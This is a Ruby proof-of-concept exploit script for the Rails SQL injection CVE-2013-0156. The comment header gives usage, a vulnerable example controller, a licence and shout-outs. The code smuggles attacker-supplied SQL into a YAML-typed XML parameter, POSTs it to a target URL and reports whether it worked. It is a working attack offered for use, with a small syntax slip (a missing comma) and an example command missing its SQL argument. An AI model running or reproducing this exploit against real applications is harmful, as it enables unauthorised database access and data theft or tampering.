#!/usr/bin/env ruby

#

# Proof-of-Concept exploit for Rails SQL Injection (CVE-2013-0156)

#

# ## Advisory

#

# https://groups.google.com/forum/#!topic/rubyonrails-security/61bkgvnSGTQ/discussion

#

# ## Caveats

#

# * Only find_by_*() methods that are passed params are vulnerable.

#

# ## Synopsis

#

# $ rails_sqli.rb URL PARAM SQL

#

# ## Dependencies

#

# $ gem install ronin-support

#

# ## Example

#

# $ rails_sqli.rb http://localhost:3000/secrets/search secret

#

# ### config/routes.rb

#

# resources :secrets do

# collection do

# post :search

# end

# end

#

# ### app/controllers/secrets_controller.rb

#

# def search

# @secret = secret.find_by_secret(params[:secret])

#

# render :json => @secret

# end

#

# ## License

#

# Copyright (c) 2013 Postmodern

#

# This exploit is free software: you can redistribute it and/or modify

# it under the terms of the GNU General Public License as published by

# the Free Software Foundation, either version 3 of the License, or

# (at your option) any later version.

#

# This exploit is distributed in the hope that it will be useful,

# but WITHOUT ANY WARRANTY; without even the implied warranty of

# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the

# GNU General Public License for more details.

#

# You should have received a copy of the GNU General Public License

# along with this exploit. If not, see <http://www.gnu.org/licenses/>.

#

# ## Shoutz

#

# drraid, cd, px, sanitybit, sysfail, trent, dbcooper, goldy, coderman, letch,

# starik, toby, jlt, HockeyInJune, cloud, zek, natron, amesc, postmodern,

# mephux, nullthreat, evoltech, flatline, r0bglesson, @ericmonti, @bascule,

# @charliesome, @homakov, @envygeek, @chendo, @bitsweat (for creating the vuln),

# @tenderlove (for fixing it), Fun Town Auto, garbage pail kids, hipsters,

# the old Jolly Inn, Irvin Santiago, that heavy metal dude who always bummed

# cigarettes off us, SophSec crew and affiliates.

#

 

require 'ronin/network/http'

require 'ronin/ui/output'

 

include Ronin::Network::HTTP

include Ronin::UI::Output::Helpers

 

unless ARGV.length == 3

$stderr.puts "usage: #{$0} URL PARAM SQL"

exit -1

end

 

url = ARGV[0]

param = ARGV[1]

sql = ARGV[2]

 

yaml = "--- !ruby/string:Arel::Nodes::SqlLiteral #{sql.dump}"

 

xml = %{

<?xml version="1.0" encoding="UTF-8"?>

<#{param} type="yaml">#{yaml}</#{param}>

}.strip

 

print_info "POSTing SQLi to #{url} ..."

 

response = http_post(

:url => url,

:headers => {

:content_type => 'text/xml'

:x_http_method_override => 'get'

},

:body => xml

)

 

print_debug "Received #{response.code} response"

 

case response.code

when '200' then print_info "Success!"

when '404' then print_error "Not found"

when '500' then print_error "Error!"

end
